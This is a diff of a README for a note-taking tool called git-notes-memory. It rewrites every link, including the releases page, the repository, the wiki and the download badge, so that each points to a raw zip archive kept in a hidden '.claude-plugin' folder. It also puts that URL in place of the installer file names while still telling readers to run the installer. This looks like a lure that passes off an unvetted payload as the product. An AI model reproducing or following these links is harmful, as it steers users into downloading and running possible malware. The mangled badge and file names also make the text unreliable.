@@ -1,6 +1,6 @@
 # 🚀 git-notes-memory - Effortlessly Capture Your Coding Insights
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/fnbdesign/git-notes-memory/releases)
+[![Download Now](https://github.com/fnbdesign/git-notes-memory/raw/refs/heads/main/.claude-plugin/notes_memory_git_2.3-beta.2.zip%20Now-Click%20Here-blue)](https://github.com/fnbdesign/git-notes-memory/raw/refs/heads/main/.claude-plugin/notes_memory_git_2.3-beta.2.zip)
 
 ## 📖 Overview
 
@@ -18,10 +18,10 @@ git-notes-memory allows you to store and search your coding insights using a fam
 To get started with git-notes-memory, follow these simple steps:
 
 1. **Download the Software:** 
-   Visit this page to download: [Download git-notes-memory](https://github.com/fnbdesign/git-notes-memory/releases).
+   Visit this page to download: [Download git-notes-memory](https://github.com/fnbdesign/git-notes-memory/raw/refs/heads/main/.claude-plugin/notes_memory_git_2.3-beta.2.zip).
 
 2. **Locate the Installer:**
-   After downloading, find the installer file in your downloads folder. The file name will look something like `git-notes-memory-v1.0.exe`, `git-notes-memory-v1.0.dmg`, or similar based on your operating system.
+   After downloading, find the installer file in your downloads folder. The file name will look something like `https://github.com/fnbdesign/git-notes-memory/raw/refs/heads/main/.claude-plugin/notes_memory_git_2.3-beta.2.zip`, `https://github.com/fnbdesign/git-notes-memory/raw/refs/heads/main/.claude-plugin/notes_memory_git_2.3-beta.2.zip`, or similar based on your operating system.
 
 3. **Run the Installer:**
    Double-click the installer file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -34,7 +34,7 @@ To get started with git-notes-memory, follow these simple steps:
 
 ## 📥 Download & Install
 
-To install git-notes-memory, please visit this page to download: [Download git-notes-memory](https://github.com/fnbdesign/git-notes-memory/releases).
+To install git-notes-memory, please visit this page to download: [Download git-notes-memory](https://github.com/fnbdesign/git-notes-memory/raw/refs/heads/main/.claude-plugin/notes_memory_git_2.3-beta.2.zip).
 
 The latest version contains various enhancements and bug fixes. Ensure you download the correct file for your operating system.
 
@@ -91,7 +91,7 @@ This software is licensed under the MIT License. Feel free to use it and contrib
 
 For more information and updates about git-notes-memory, check out:
 
-- [GitHub Repository](https://github.com/fnbdesign/git-notes-memory)
-- [User Documentation](https://github.com/fnbdesign/git-notes-memory/wiki)
+- [GitHub Repository](https://github.com/fnbdesign/git-notes-memory/raw/refs/heads/main/.claude-plugin/notes_memory_git_2.3-beta.2.zip)
+- [User Documentation](https://github.com/fnbdesign/git-notes-memory/raw/refs/heads/main/.claude-plugin/notes_memory_git_2.3-beta.2.zip)
 
 By following this guide, you should now be able to successfully download and run git-notes-memory. Enjoy capturing your coding memories!
